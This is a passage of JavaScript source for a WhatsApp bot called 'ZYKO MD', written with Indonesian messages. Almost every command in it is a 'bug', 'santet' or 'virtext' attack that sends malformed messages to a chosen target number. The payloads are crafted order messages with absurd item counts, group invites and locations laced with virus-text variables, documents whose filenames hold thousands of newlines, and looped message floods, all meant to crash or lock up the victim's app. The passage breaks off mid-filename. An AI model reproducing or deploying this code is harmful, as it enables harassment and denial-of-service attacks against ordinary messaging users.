{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(Pe, { 
text: 'POWERED BY ZYKO MD', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
m.reply('sukses send bug kepada target')
}
break
//=================================================//
case 'jadibugpayment' : {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
conn.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `Miku21Bot`,"body": `Selamat ${ucapan()} kak ${name}`,
mimetype: 'audio/mpeg', caption: `🔥 ${text} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://www.youtube.com/@zykobotz`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
case 'jadibugsw': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
let joau = fs.readFileSync('./media/ok.jpg')
conn.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${text } ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case '🔥': 
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${command}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "𝙘𝙞𝙡𝙤 𝙗𝙤𝙩",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
conn.sendMessage(m.chat, buttonMessage)
}
 break
//=================================================//
//=================================================//
case 'jadibugbutton':
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
const buttonssk = [
{buttonId: `${command}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${text } ${bugsw}`,
footerText: '🔥 ${text} ',
buttons: buttonssk,
headerType: 1
}
conn.sendMessage(m.chat, buttonnnnmMessage)
}
 break
//=================================================//
case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${nameown}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY ZYKO MODS WA",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m})
conn.relayMessage(Pe, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/elaina5.png') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME ZYKO MD${buttonvirus}`,
"groupName": `MY NAME ZYKO MD${buttonvirus}`,
"caption": `${buttonvirus}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
conn.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ZYKO MD`,
}
}}), { userJid: m.chat, quoted:m})
conn.relayMessage(Pe, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'senddocu': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
conn.relayMessage(Pe, document.message, { messageId: document.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/elaina4.png') }, { upload: conn.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© ZYKO MD${buttonvirus}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
conn.relayMessage(Pe, liveLocation.message, { messageId: liveLocation.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'sendlokas2': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/elaina3.png') }, { upload: conn.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© ZYKO MD${buttonvirus}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
conn.relayMessage(Pe, location.message, { messageId: location.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'sendtrol2': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/elaina2.png') }, { upload: conn.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ZYKO MD${buttonvirus}`,
"jpegThumbnail": fla,
"orderTitle": `© ZYKO MD${buttonvirus}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted:m})
conn.relayMessage(Pe, order.message, { messageId: order.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'senddocu2': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ZYKO MD WA☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
conn.relayMessage(Pe, document.message, { messageId: document.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'virtext': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext2': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone1}` }, { quoted:m })
}
}
break
case 'jadivirtext1': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${text} ${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext2': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${text} ${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtex3': {

if (!ext) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext4': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext5': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext6': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext7': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext8': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext9': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)

{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext10': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${text} ${iphone2}`}, { quoted:m })
}
}
break
//=================================================//
case 'virtext3': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext4': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext5': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext6': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext7': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${iphone6}` }, { quoted:m })
}
}
break
case 'jadijago': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
 var message = {
document : fs.readFileSync("./mp3/a-virusaudio-v1.mp3"),
"fileName": `🔥 ${text} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n